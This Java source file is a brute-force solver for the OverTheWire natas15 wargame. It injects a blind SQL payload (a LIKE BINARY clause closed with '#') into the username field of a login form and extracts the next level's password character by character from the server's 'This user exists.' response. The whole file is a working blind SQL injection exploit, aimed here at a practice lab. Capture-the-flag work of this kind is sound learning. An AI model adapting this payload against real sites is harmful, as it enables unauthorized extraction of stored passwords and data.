import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.auth.AuthScope;
import org.apache.http.auth.UsernamePasswordCredentials;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.BasicCredentialsProvider;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.List;

/**
 * Created by alexk on 12.07.2017.
 */
public class SqlInjectBruteForce {
    static String marker = "This user exists.";
    static String avaibleChars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

    public static void main(String[] args) throws Exception {
        String url = "http://natas15.natas.labs.overthewire.org/index.php?debug";
        BasicCredentialsProvider credentialsProvider = new BasicCredentialsProvider();
        UsernamePasswordCredentials natas15 = new UsernamePasswordCredentials("natas15", "<censored>");
        credentialsProvider.setCredentials(AuthScope.ANY, natas15);
        HttpClient httpClient = HttpClientBuilder.create().setDefaultCredentialsProvider(credentialsProvider).build();

        String password = "";
        for (int i = 0; i < 32; i++) {
            for (char c : avaibleChars.toCharArray()) {
                HttpPost post = generateRequest(url, "natas16\" AND password LIKE BINARY '" + password + c + "%'#");
                HttpResponse response = httpClient.execute(post);
                if (passwordMatches(response)) {
                    password += c;
                    System.out.println(password);
                }
            }
        }
    }

    private static boolean passwordMatches(HttpResponse response) throws IOException {
        return response.getStatusLine().getStatusCode() == 200 &&
                EntityUtils.toString(response.getEntity(), "UTF-8").contains(marker);
    }

    private static HttpPost generateRequest(String url, String query) throws UnsupportedEncodingException {
        HttpPost post = new HttpPost(url);
        List<NameValuePair> params = new ArrayList<>();
        params.add(new BasicNameValuePair("username", query));
        post.setEntity(new UrlEncodedFormEntity(params));
        return post;
    }
}
